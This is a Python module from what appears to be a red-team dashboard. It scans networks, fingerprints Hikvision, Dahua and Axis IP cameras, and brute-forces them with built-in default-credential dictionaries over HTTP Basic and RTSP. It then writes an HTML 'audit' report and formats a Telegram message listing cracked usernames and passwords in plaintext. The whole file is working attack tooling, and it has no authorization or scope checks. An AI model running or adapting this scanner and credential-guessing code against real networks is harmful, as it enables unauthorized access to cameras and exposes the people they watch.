#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOURCESEAL TACTICAL EXECUTOR v1.0 — Capacidad real de ejecución integrada
al dashboard_server del Red-Team-Tauri.

Flujo: descubrir hosts → escanear puertos → identificar cámaras/vendor →
probar credenciales (HTTP Basic + RTSP Auth) → generar informe HTML con
hash SHA-256 → notificar por Telegram → guardar evidencia.

TODO con TCP connect() puro — funciona en Termux sin root.

Importado por dashboard_server.py y expuesto via API endpoints.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import os
import socket
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

# ── Diccionario de credenciales por vendor ─────────────────────────────────
CREDENTIAL_DICT: Dict[str, List[tuple]] = {
    "hikvision": [
        ("admin", "12345"), ("admin", "admin"), ("admin", ""),
        ("admin", "123456"), ("admin", "password123"), ("admin", "hikvision"),
        ("admin", "1234"), ("admin", "pass"), ("root", "12345"),
        ("admin", "4321"), ("admin", "54321"), ("admin", "654321"),
    ],
    "dahua": [
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("admin", "dahua"), ("admin", "1234"), ("admin", "0000"),
        ("admin", "1111"), ("admin", "8888"), ("root", "root"),
        ("admin", "888888"), ("admin", "666666"), ("admin", "111111"),
    ],
    "axis": [
        ("root", "pass"), ("root", "root"), ("admin", "admin"),
        ("admin", "password"), ("admin", "123456"),
    ],
    "generic": [
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("root", "root"), ("admin", ""), ("root", "admin"),
        ("user", "user"), ("admin", "1234"), ("admin", "0000"),
        ("guest", "guest"), ("ubnt", "ubnt"), ("administrator", "admin"),
    ],
}

# Puertos a escanar en el sweep táctico
TACTICAL_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
    554, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379,
    8080, 8443, 27017, 37777, 34567, 6789, 8888, 9000, 1900,
]

# Puertos que indican cámara IP
CAMERA_INDICATOR_PORTS = {554, 37777, 34567, 6789, 8888, 8554}

# OUI prefixes de fabricantes de cámaras (subset)
CAMERA_MAC_PREFIXES = {
    "cc:ea", "f8:a9", "00:0c", "44:19",  # Hikvision
    "3c:ef:8c", "a0:bd:cd",               # Dahua
    "ac:cc", "8c:e6", "00:40:8c",         # Axis
    "b0:c5:54", "24:a0:07",               # ONVIF genérico
}


def _vendor_from_banner(banner: str) -> str:
    """Identifica el vendor de una cámara desde el banner HTTP/RTSP."""
    bl = banner.lower()
    if "hikvision" in bl or "hik" in bl or "isapi" in bl:
        return "hikvision"
    if "dahua" in bl or "login_login" in bl:
        return "dahua"
    if "axis" in bl:
        return "axis"
    if "onvif" in bl:
        return "onvif"
    if "dvr" in bl and "xiongmai" in bl:
        return "dahua"
    return "unknown"


def _vendor_from_mac(mac: str) -> str:
    """Intenta identificar vendor por prefijo MAC OUI."""
    if not mac:
        return "unknown"
    ml = mac.lower()
    for prefix in CAMERA_MAC_PREFIXES:
        if ml.startswith(prefix):
            # Heurística simple: prefijos conocidos de Hikvision
            if prefix in ("cc:ea", "f8:a9", "00:0c", "44:19"):
                return "hikvision"
            return "onvif"
    return "unknown"


async def _tcp_check(ip: str, port: int, timeout: float = 0.5) -> bool:
    """TCP connect() — True si el puerto está abierto."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return True
    except Exception:
        return False


async def _grab_banner(ip: str, port: int, timeout: float = 2.0) -> Optional[str]:
    """Banner grabbing via TCP raw socket."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        if port in (80, 8080, 8000, 8443, 443):
            scheme = "https" if port in (443, 8443) else "http"
            req = (
                f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
                f"User-Agent: SourceSeal-Tactical/1.0\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
        elif port == 554:
            req = f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode()
        else:
            req = b"\r\n"

        writer.write(req)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return data.decode(errors="ignore")[:300] if data else None
    except Exception:
        return None


async def _test_http_auth(
    ip: str, port: int, user: str, pwd: str, timeout: float = 2.0
) -> bool:
    """Prueba HTTP Basic Auth real contra un endpoint de la cámara."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        req = (
            f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
            f"Authorization: Basic {auth}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        writer.write(req)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(2048), timeout=3.0)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        text = data.decode(errors="ignore")
        # 200 OK = credenciales válidas
        if "200 OK" in text or "200 ok" in text:
            return True
        # 401/403 = credenciales inválidas (pero el servicio responde)
        return False
    except Exception:
        return False


async def _test_rtsp_auth(
    ip: str, port: int, user: str, pwd: str, timeout: float = 2.0
) -> bool:
    """Prueba RTSP Basic Auth real contra el stream de la cámara."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        req = (
            f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {auth}\r\n\r\n"
        ).encode()
        writer.write(req)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=3.0)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        text = data.decode(errors="ignore")
        # 200 OK = credenciales válidas
        if "200 OK" in text:
            return True
        return False
    except Exception:
        return False


async def test_credentials(
    ip: str, port: int, vendor: str
) -> List[Dict[str, Any]]:
    """Prueba credenciales por defecto contra una cámara detectada.

    Retorna lista de credenciales válidas encontradas (puede ser >1 si
    múltiples pares funcionan).
    """
    creds_list = CREDENTIAL_DICT.get(vendor, CREDENTIAL_DICT["generic"])
    results = []

    for user, pwd in creds_list:
        if port in (80, 8080, 8000, 443, 8443):
            ok = await _test_http_auth(ip, port, user, pwd)
            method = "HTTP"
        elif port == 554:
            ok = await _test_rtsp_auth(ip, port, user, pwd)
            method = "RTSP"
        else:
            continue

        if ok:
            results.append({
                "ip": ip, "port": port, "user": user,
                "password": pwd, "method": method, "vendor": vendor,
            })
            break  # Un par válido es suficiente

    return results


async def identify_camera(
    ip: str, open_ports: List[int], mac: Optional[str] = None
) -> Optional[Dict[str, Any]]:
    """Identifica si un host es una cámara IP y de qué vendor.

    Criterios: puertos indicadores (554/37777/34567), banner HTTP/RTSP,
    o MAC OUI conocida de fabricantes de cámaras.
    """
    has_camera_port = any(p in open_ports for p in CAMERA_INDICATOR_PORTS)
    if not has_camera_port and not mac:
        return None

    vendor = "unknown"
    banner = None

    # Intentar banner grabbing del puerto más prioritario
    for port in (554, 80, 8080, 37777, 34567, 8000):
        if port in open_ports:
            banner = await _grab_banner(ip, port)
            if banner:
                vendor = _vendor_from_banner(banner)
                break

    # Si el banner no identificó vendor, probar MAC
    if vendor == "unknown" and mac:
        vendor = _vendor_from_mac(mac)

    # Si no tiene puerto de cámara ni vendor identificable, no es cámara
    if not has_camera_port and vendor == "unknown":
        return None

    return {
        "ip": ip,
        "ports": [p for p in open_ports if p in CAMERA_INDICATOR_PORTS or p in (80, 8080, 443)],
        "vendor": vendor,
        "banner": (banner or "")[:100],
        "mac": mac,
    }


async def run_tactical_scan(
    hosts: List[Dict[str, Any]],
    scan_ports: Optional[List[int]] = None,
    progress_callback=None,
) -> Dict[str, Any]:
    """Ejecuta el scan táctico completo sobre una lista de hosts ya descubiertos.

    Recibe hosts del formato que produce _discover_hosts_tcp / discover_network:
    {"ip": ..., "mac": ..., "type": ..., "ports": [...], ...}
    Devuelve un dict con hosts escaneados, cámaras encontradas, credenciales
    válidas y metadatos del scan.
    """
    ports = scan_ports or TACTICAL_PORTS
    start_time = time.time()
    all_cameras = []
    all_creds = []
    scanned_hosts = []

    for i, host in enumerate(hosts):
        ip = host.get("ip", "")
        if not ip or ip == "127.0.0.1":
            continue

        if progress_callback:
            await progress_callback(i, len(hosts), ip)

        # Si el host ya tiene puertos del fingerprint del dashboard, usarlos
        existing_ports = host.get("ports", [])
        if existing_ports and isinstance(existing_ports, list) and existing_ports:
            open_port_nums = [
                p["port"] if isinstance(p, dict) else p
                for p in existing_ports
            ]
        else:
            # Escanear puertos nosotros
            tasks = [_tcp_check(ip, p) for p in ports]
            results = await asyncio.gather(*tasks)
            open_port_nums = [p for p, ok in zip(ports, results) if ok]

        if not open_port_nums:
            continue

        scanned_hosts.append({
            "ip": ip,
            "mac": host.get("mac"),
            "ports": open_port_nums,
            "type": host.get("type", "unknown"),
        })

        # Identificar si es cámara
        cam = await identify_camera(ip, open_port_nums, mac=host.get("mac"))
        if cam:
            all_cameras.append(cam)

            # Probar credenciales
            creds = await test_credentials(cam["ip"], cam["ports"][0], cam["vendor"])
            all_creds.extend(creds)
            if creds:
                cam["credentials"] = creds[0]
            else:
                cam["credentials"] = None

    elapsed = time.time() - start_time
    return {
        "hosts_scanned": len(scanned_hosts),
        "hosts": scanned_hosts,
        "cameras": all_cameras,
        "credentials_found": all_creds,
        "elapsed_seconds": round(elapsed, 2),
        "timestamp": datetime.now().isoformat(),
    }


def generate_sealed_report(data: Dict[str, Any], reports_dir: Path) -> Dict[str, str]:
    """Genera un informe HTML sellado con hash SHA-256 y lo guarda en disco.

    Retorna {"html_path": ..., "hash": ..., "filename": ...}
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_str = json.dumps(data, sort_keys=True, default=str)
    integrity_hash = hashlib.sha256(data_str.encode()).hexdigest()

    # Guardar hash en archivo de evidencia
    hash_file = reports_dir / f"evidencia_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    hash_file.write_text(
        f"SHA-256: {integrity_hash}\nTimestamp: {timestamp}\n"
        f"Hosts: {data.get('hosts_scanned', 0)}\n"
        f"Cámaras: {len(data.get('cameras', []))}\n"
        f"Credenciales: {len(data.get('credentials_found', []))}\n",
        encoding="utf-8",
    )

    hosts = data.get("hosts", [])
    cameras = data.get("cameras", [])
    credentials = data.get("credentials_found", [])

    # Construir HTML
    camera_rows = "".join(
        f"<tr><td>{c['ip']}</td><td>{', '.join(str(p) for p in c.get('ports', []))}</td>"
        f"<td>{c.get('vendor', 'unknown')}</td>"
        f"<td>{c.get('credentials', {}).get('user', '-') if c.get('credentials') else 'No'}</td></tr>"
        for c in cameras
    )

    cred_rows = "".join(
        f"<tr><td>{c['ip']}</td><td>{c['port']}</td><td>{c['user']}</td>"
        f"<td class='pwd'>{'*' * len(c['password'])}</td><td>{c['method']}</td></tr>"
        for c in credentials
    )

    host_rows = "".join(
        f"<tr><td>{h['ip']}</td><td>{h.get('mac', '-') or '-'}</td>"
        f"<td>{', '.join(str(p) for p in h.get('ports', []))}</td>"
        f"<td>{h.get('type', '?')}</td></tr>"
        for h in hosts
    )

    html = f"""<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SourceSeal — Informe Táctico</title>
<style>
:root {{ --bg: #0a0e17; --card: #111827; --border: #1e293b; --accent: #f59e0b; --text: #e2e8f0; --muted: #64748b; }}
body {{ background: var(--bg); color: var(--text); font-family: 'SF Mono', 'Fira Code', monospace; padding: 2rem; margin: 0; }}
h1 {{ color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: .5rem; }}
h2 {{ color: #38bdf8; margin-top: 2rem; }}
.card {{ background: var(--card); border: 1px solid var(--border); border-radius: .75rem; padding: 1.5rem; margin: 1rem 0; overflow-x: auto; }}
table {{ width: 100%; border-collapse: collapse; font-size: .85rem; }}
th {{ text-align: left; color: var(--accent); padding: .5rem; border-bottom: 1px solid var(--border); }}
td {{ padding: .5rem; border-bottom: 1px solid var(--border); }}
.pwd {{ font-family: monospace; color: #ef4444; }}
.hash {{ background: #0f172a; padding: .75rem; border-radius: .5rem; color: var(--accent); font-size: .8rem; word-break: break-all; }}
.summary {{ display: flex; gap: 1rem; flex-wrap: wrap; }}
.stat {{ background: var(--card); border: 1px solid var(--border); border-radius: .5rem; padding: 1rem 2rem; text-align: center; }}
.stat .num {{ font-size: 2rem; font-weight: bold; color: var(--accent); }}
.stat .label {{ font-size: .75rem; color: var(--muted); text-transform: uppercase; }}
.muted {{ color: var(--muted); }}
@media (max-width: 640px) {{ body {{ padding: 1rem; }} .summary {{ flex-direction: column; }} }}
</style>
</head>
<body>
<h1>🔐 SourceSeal — Informe Táctico de Auditoría</h1>
<p class="muted">Timestamp: {timestamp} | Duración: {data.get('elapsed_seconds', '?')}s</p>

<div class="summary">
  <div class="stat"><div class="num">{len(hosts)}</div><div class="label">Hosts</div></div>
  <div class="stat"><div class="num">{len(cameras)}</div><div class="label">Cámaras</div></div>
  <div class="stat"><div class="num">{len(credentials)}</div><div class="label">Credenciales</div></div>
</div>

<div class="card"><h2>🔐 Sello de Integridad</h2>
<div class="hash">SHA-256: {integrity_hash}</div>
<p class="muted" style="margin-top:.5rem">Hash calculado sobre el JSON completo del scan. Cualquier modificación altera el hash.</p>
</div>

<div class="card"><h2>📡 Hosts Descubiertos</h2>
<table><tr><th>IP</th><th>MAC</th><th>Puertos</th><th>Tipo</th></tr>
{host_rows or '<tr><td colspan="4" class="muted">Sin hosts</td></tr>'}
</table></div>

<div class="card"><h2>📷 Cámaras Detectadas</h2>
<table><tr><th>IP</th><th>Puertos</th><th>Vendor</th><th>Creds</th></tr>
{camera_rows or '<tr><td colspan="4" class="muted">Sin cámaras</td></tr>'}
</table></div>

<div class="card"><h2>🔑 Credenciales Válidas</h2>
<table><tr><th>IP</th><th>Puerto</th><th>Usuario</th><th>Contraseña</th><th>Método</th></tr>
{cred_rows or '<tr><td colspan="5" class="muted">Sin credenciales válidas</td></tr>'}
</table></div>

<p class="muted" style="margin-top:2rem;font-size:.75rem">
Generado por SourceSeal Tactical Engine v1.0 — Red-Team-Tauri
</p>
</body>
</html>"""

    filename = f"tactical_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    report_path = reports_dir / filename
    report_path.write_text(html, encoding="utf-8")

    return {
        "html_path": str(report_path),
        "hash": integrity_hash,
        "filename": filename,
        "hash_file": str(hash_file),
    }


def format_telegram_message(data: Dict[str, Any], report_info: Dict[str, str]) -> str:
    """Formatea el mensaje de Telegram con los resultados del scan táctico."""
    lines = [
        "🔥 *AUDITORÍA TÁCTICA COMPLETADA*",
        "",
        f"📊 Hosts: {data.get('hosts_scanned', 0)}",
        f"📷 Cámaras: {len(data.get('cameras', []))}",
        f"🔑 Credenciales: {len(data.get('credentials_found', []))}",
        f"⏱ Duración: {data.get('elapsed_seconds', '?')}s",
        "",
        f"📄 Informe: `{report_info.get('filename', '')}`",
        f"🔐 Hash: `{report_info.get('hash', '')[:32]}...`",
    ]

    # Agregar credenciales encontradas (hasta 5)
    for cred in data.get("credentials_found", [])[:5]:
        lines.append(
            f"  ✅ `{cred['ip']}:{cred['port']}` → "
            f"`{cred['user']}:{cred['password']}` ({cred['method']})"
        )

    if len(data.get("credentials_found", [])) > 5:
        lines.append(f"  ... y {len(data['credentials_found']) - 5} más")

    return "\n".join(lines)
